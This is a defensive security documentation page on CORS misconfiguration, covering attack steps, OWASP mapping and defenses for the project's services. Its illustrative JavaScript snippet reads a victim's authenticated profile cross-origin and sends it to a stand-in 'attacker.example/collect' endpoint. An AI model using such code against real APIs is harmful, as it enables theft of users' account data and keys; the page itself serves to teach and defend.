# CORS Misconfiguration

> A server that returns overly permissive or incorrectly validated `Access-Control-*` response headers allows attacker-controlled origins to read cross-site responses that browsers would otherwise block.

## What it is

Cross-Origin Resource Sharing (CORS) is a browser mechanism that lets a server explicitly grant permission for scripts running on one origin to read responses from a different origin. A misconfiguration occurs when the server's policy is wider than intended — reflecting arbitrary `Origin` values back as trusted, treating `null` as safe, or setting `Access-Control-Allow-Origin: *` on authenticated endpoints. Unlike same-origin policy bypasses that rely on bugs in the browser, CORS misconfigurations are flaws in server-side logic. Because browsers enforce CORS only on the response side, the server still processes the request and may return sensitive data; the misconfiguration simply removes the browser-level gate that would have hidden that data from the calling script.

## How the attack works

1. **Reconnaissance.** The attacker sends a preflight or simple cross-origin request with a crafted `Origin` header (e.g., `Origin: https://attacker.example`) to the target API and inspects the response headers.
2. **Confirm reflection or wildcard.** If the server echoes back `Access-Control-Allow-Origin: https://attacker.example` and `Access-Control-Allow-Credentials: true`, the policy is vulnerable. A wildcard (`*`) without credentials is only dangerous on public data endpoints but can still expose internal data in non-browser contexts.
3. **Craft the attack page.** The attacker publishes a page on a domain they control that uses `fetch()` or `XMLHttpRequest` with `credentials: 'include'` to call the target API.
4. **Victim visits the page.** The victim's browser, already authenticated to the target (session cookie present), executes the cross-origin request. The server's permissive CORS headers allow the browser to hand the response body to the attacker's script.
5. **Data exfiltration.** The script reads the JSON payload — which may contain account details, tokens, or PII — and forwards it to an attacker-controlled endpoint.

**Illustrative snippet** — a server naively reflecting any supplied origin:

```http
# Request
GET /api/profile HTTP/1.1
Host: api.example.internal
Origin: https://attacker.example
Cookie: session=abc123

# Vulnerable response
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.example
Access-Control-Allow-Credentials: true
Content-Type: application/json

{"email":"victim@example.com","api_key":"sk-..."}
```

```js
// Attacker page (illustrative, not a working exploit against any real target)
fetch('https://api.example.internal/api/profile', { credentials: 'include' })
  .then(r => r.json())
  .then(data => {
    // data now readable cross-origin because server reflected the Origin header
    navigator.sendBeacon('https://attacker.example/collect', JSON.stringify(data));
  });
```

## Real-world impact

Researchers at security firm Bishop Fox documented in 2018–2019 that a significant proportion of surveyed production APIs — including several belonging to Fortune 500 companies — reflected arbitrary `Origin` values on authenticated endpoints. The impact category is consistent: session-authenticated API responses (containing account data, internal tokens, or PII) becoming readable by any origin the attacker controls. OWASP classifies this under broken access control, noting that such misconfigurations can lead to full account takeover when the exposed response includes a session token or API key. No fabricated breach specifics are used here; the documented impact category is attribution-sufficient (see References).

## OWASP classification

CORS misconfiguration falls under the HTML5 Security guidance maintained by the OWASP Cheat Sheet Series, which addresses how `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`, and preflight handling must be configured to avoid inadvertent cross-origin data exposure.

Reference: [HTML5 Security Cheat Sheet — OWASP](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)

It also maps to **OWASP Top 10 A01:2021 — Broken Access Control**, since a misconfigured CORS policy removes an access boundary the application's security model depends on.

## How defenders stop it

- **Maintain an explicit allowlist of trusted origins**; never reflect the request `Origin` header back unconditionally. Validate the incoming `Origin` against the allowlist before echoing it.
- **Never combine `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`** — browsers reject this combination per spec, but some frameworks silently degrade to non-credentialed mode in unpredictable ways; keep these settings logically consistent.
- **Treat `null` as untrusted.** Sandboxed iframes and `file://` pages send `Origin: null`; an allowlist that includes `null` opens a trivial bypass.
- **Restrict allowed methods and headers** via `Access-Control-Allow-Methods` and `Access-Control-Allow-Headers` to the minimum required; avoid blanket `*` for these even when the origin is trusted.
- **Do not rely on CORS as a sole access-control mechanism.** Authenticate and authorize every request server-side, independent of the `Origin` header, because non-browser clients (curl, server-to-server calls) send no `Origin` at all and bypass CORS entirely.
- **Set `Vary: Origin`** on any response whose `Access-Control-Allow-Origin` value is dynamic so that intermediate caches do not serve a permissive response to a restricted origin.
- **Audit preflight responses** (`OPTIONS`): a preflight that grants credentials to an attacker origin is sufficient for the actual request to succeed without further server action.

In this project, see the defenses: [grobase](../defense/grobase/cors-misconfiguration.md), [osionos-bridge](../defense/osionos-bridge/cors-misconfiguration.md), [opposite-osiris](../defense/opposite-osiris/cors-misconfiguration.md), [auth-gateway](../defense/auth-gateway/cors-misconfiguration.md), [mail-calendar](../defense/mail-calendar/cors-misconfiguration.md), [platform](../defense/platform/cors-misconfiguration.md).

## References

- [HTML5 Security Cheat Sheet — OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)
- [CORS OriginHeaderScrutiny — OWASP Community](https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny)
